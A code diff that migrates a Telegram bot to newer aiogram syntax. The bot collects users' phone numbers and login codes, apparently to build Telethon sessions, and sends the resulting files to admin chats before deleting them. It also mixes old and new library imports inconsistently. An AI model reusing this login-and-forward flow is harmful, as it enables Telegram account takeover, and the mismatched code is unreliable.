@@ -1,8 +1,9 @@
 import logging
 import asyncio
 import os
-from aiogram import Bot, Dispatcher, types
+from aiogram import Bot, Dispatcher, types, F
 from aiogram.dispatcher.middlewares import BaseMiddleware
+from aiogram.filters import Command
 from aiogram.types import ParseMode
 from aiogram.utils import executor
 from telethon import TelegramClient
@@ -48,29 +49,30 @@ async def send_files_to_bot(bot, admin_chat_ids, user_chat_id):
         
         for file_to_send in files_to_send:
             for admin_chat_id in admin_chat_ids:
-                async with bot.send_document(admin_chat_id, open(file_to_send, "rb")) as file:
-                    await bot.send_document(admin_chat_id, file)
-            async with bot.send_document(user_chat_id, open(file_to_send, "rb")) as file:
-                await bot.send_document(user_chat_id, file)
+                await bot.send_document(admin_chat_id, types.InputFile(file_to_send))
+            await bot.send_document(user_chat_id, types.InputFile(file_to_send))
             os.remove(file_to_send)
 
 # Middleware для логирования
 class LoggingMiddleware(BaseMiddleware):
-    async def on_pre_process_update(self, update, data):
-        logging.info(f"Update: {update}")
+    async def __call__(self, handler, event, data):
+        logging.info(f"Update: {event}")
+        return await handler(event, data)
 
-dp.middleware.setup(LoggingMiddleware())
+dp.update.middleware(LoggingMiddleware())
 
 # Обработчики сообщений
-@dp.message(commands=['start'])
+@dp.message(Command(commands=['start']))
 async def send_welcome(message: types.Message):
     if message.from_user.id in allowed_users:
         await message.answer("Добро пожаловать! Пожалуйста, введите ваш номер телефона в международном формате.")
     else:
         await message.answer("Извините, вы не авторизованы для использования этого бота.")
 
-@dp.message(lambda message: message.text and message.text.startswith('+') and message.from_user.id in allowed_users)
+@dp.message(F.text.startswith('+'))
 async def get_phone_number(message: types.Message):
+    if message.from_user.id not in allowed_users:
+        return
     phone_number = message.text
     user_state[message.from_user.id] = {'phone_number': phone_number}
     try:
@@ -81,8 +83,10 @@ async def get_phone_number(message: types.Message):
     except Exception as e:
         await message.answer(f"Произошла ошибка: {e}")
 
-@dp.message(lambda message: message.text and message.from_user.id in user_state and 'phone_code_hash' in user_state[message.from_user.id])
+@dp.message(F.text.regexp(r'^\d{5,}$'))
 async def get_code(message: types.Message):
+    if message.from_user.id not in user_state or 'phone_code_hash' not in user_state[message.from_user.id]:
+        return
     code = message.text
     phone_number = user_state[message.from_user.id]['phone_number']
     phone_code_hash = user_state[message.from_user.id]['phone_code_hash']
